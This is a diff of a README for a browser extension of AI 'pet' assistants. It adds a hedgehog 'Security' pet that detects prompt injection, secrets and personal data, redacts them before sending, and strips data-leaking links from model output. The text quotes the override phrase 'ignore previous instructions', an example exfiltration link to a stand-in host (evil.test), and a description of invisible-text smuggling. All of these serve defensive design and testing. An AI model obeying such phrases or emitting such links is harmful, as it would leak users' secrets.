@@ -24,7 +24,45 @@ The look follows the design mockups: cool grey background, white rounded cards, 
 
 ### Characters
 
-Each pet is one of seven characters: **cat, dog, bird, frog, bunny, bear, ghost**. They're drawn as SVG, with an open face and a happy ^^ face shown on hover and while working. The default squad is Scout the dog, Quill the bird, Pixel the cat and Sprout the frog. In the Studio, each pet card has a character picker and color swatches, and *Adopt* picks a character the squad doesn't have yet. Pets saved before characters existed are migrated automatically.
+Each pet is one of eight characters: **cat, dog, bird, frog, bunny, bear, ghost, hedgehog**. They're drawn as SVG, with an open face and a happy ^^ face shown on hover and while working. The default squad is Scout the dog, Quill the bird, Pixel the cat, Sprout the frog and Security the hedgehog. In the Studio, each pet card has a character picker and color swatches, and *Adopt* picks a character the squad doesn't have yet. Pets saved before characters existed are migrated automatically.
+
+### Security: the guard pet (AI safety & ethics)
+
+![Bundles of Skills](extension/brand/logo.png)
+
+**Security** is a hedgehog that joins the squad (Scout, Quill, Pixel, Sprout, Security). It does two jobs: it has its own skills, and it **guards every other pet**. Built for the Sandia Security Track: securely implementing AI, securing agentic workflows, and making AI security visible to everyday users.
+
+**Its skills**
+
+| Skill | Where it runs | What it does |
+|---|---|---|
+| Check for hidden instructions | **On this device** | Finds prompt injection in what you picked: "ignore previous instructions", fake system messages, requests to send data out or hide things from you, attempts to break out of the content wrapper, and **invisible text** (zero-width characters, text-direction overrides, Unicode "tag" characters used for ASCII smuggling). |
+| Spot sensitive data | **On this device** | Lists API keys and tokens (OpenAI/OpenRouter, AWS, GitHub, Slack, Google, Figma, JWTs, private keys), passwords, emails, phone numbers, card numbers (Luhn-checked) and ID numbers. |
+| Review for bias & harm | Model | Flags biased, exclusionary or harmful wording or imagery, with neutral alternatives. |
+| Check AI output | Model | Claims to verify, signs of fabrication, overconfidence, and a reliability rating. |
+| Is this a scam? | Model | Phishing and social-engineering signals, a verdict, and what to do next. |
+
+The two on-device skills never call the model: Security checks your data without sending it anywhere. Their reports never repeat a secret in full.
+
+**The guard (on by default, Options › Security guard)**
+
+1. **Before anything leaves the browser.** Every run from any pet, and the Studio's *Try it*, is checked in the **service worker**, the one place every request passes through before the network. No page script can reach it or skip it. If Security finds secrets, personal data or hidden instructions, the run **pauses** and shows what it found, masked (`sk-or-…89`, `j***@example.com`). You choose **Redact & send** (secrets become `[API KEY]`, `[EMAIL]`… and invisible characters are removed), **Send anyway**, or **Cancel**. Nothing is sent until you choose.
+2. **Untrusted output, before it acts.** Pets can rewrite your text and post Figma comments. Those are actions with side effects, so model output is treated as untrusted: Security checks it for invisible text, injected instructions, leaked secrets and **links that carry data out** (for example `![x](https://evil.test/p.png?d=<secret>)`). Leaking links and hidden text are **removed**, not just flagged, and the panel says so before you approve.
+3. **Containment.** Picked content goes to the model inside `<picked_content>` and the system prompt treats it as data. Content can no longer close or reopen that wrapper: tag lookalikes inside it are neutralised, and a unit test proves injected text stays inside.
+4. **Least privilege, visible.** The loading screen says exactly what is being sent and where ("Sending 41 words to the model (openrouter.ai), after a Security check"). Pets still only receive what their *Can read* permissions allow.
+5. **Audit trail without the secrets.** Every History entry records what Security found, what you chose and where the data went ("Security: found secrets (1), personal data (1); masked 2 before sending"). History **never stores secrets or personal data**, even if you chose *Send anyway*: the saved input is always the masked version.
+
+**Threat model**
+
+| Threat | Mitigation |
+|---|---|
+| Sensitive data leaks to the model provider | Local scan + pause + redaction in the service worker; masked previews; masked History |
+| Prompt injection in picked content (visible or invisible) | Local detection, strict data wrapper that content can't escape, invisible characters stripped on redaction |
+| A model result smuggles instructions or data out when applied | Output scan before approve/post; leaking links and hidden text removed; "Approve anyway" makes it a conscious choice |
+| A page script tampering with the guard | The guard runs in the service worker; the UI lives in a closed shadow root; keys never enter the page |
+| Logs becoming a second leak | History stores masked input only, and Security's records hold counts and categories, never values |
+
+The detection code is `src/security.js`: pure functions, no network, unit-tested for true positives *and* false positives on ordinary writing.
 
 ### 2. On any page: the squad dock (04 Pet squad)
 
@@ -165,11 +203,14 @@ npm test
 npm run e2e
 ```
 
-`npm test` has 26 unit tests covering matching, permissions, Figma URL parsing, request building, history and the OpenRouter client. `npm run e2e` loads the real extension in Chromium with OpenRouter and the Figma API **faked**, then checks:
+No Playwright Chromium installed? Point the e2e run at any Chrome for Testing build: `CHROME_PATH=/path/to/chrome npm run e2e`.
+
+`npm test` has 40 unit tests covering matching, permissions, Figma URL parsing, request building, history, the OpenRouter client, and Security (secret/PII/injection detection, false positives, redaction, link removal, wrapper containment, adding Security to older libraries). `npm run e2e` loads the real extension in Chromium with OpenRouter and the Figma API **faked**, then checks:
 - drag Quill onto a field → approve a rewrite (and that nothing changes before approval)
 - drag Pixel onto an image → a screenshot is sent
 - box-select a paragraph → click Scout → summarize
 - the search bar
+- **Security**: Quill on a field holding an API key and an email → the guard pauses before sending → *Redact & send* → the request contains `[API KEY]` and `[EMAIL]`, never the real values, and History doesn't store them; *Cancel* sends nothing; Security's on-device injection check finds 3 issues without calling the model; a result with a data-leaking link is flagged and the link removed
 - a fake Figma file → drag Pixel onto the frame → approve → a comment is posted to node `12:34` with the frame's text layers in the prompt
 - Studio: Pets view (rail, Add skills drawer adds two skills, accordion details), All skills *Known by* toggle, Stickers view, create a new skill and assign it
 - resizing a selection with its handles re-reads the new area
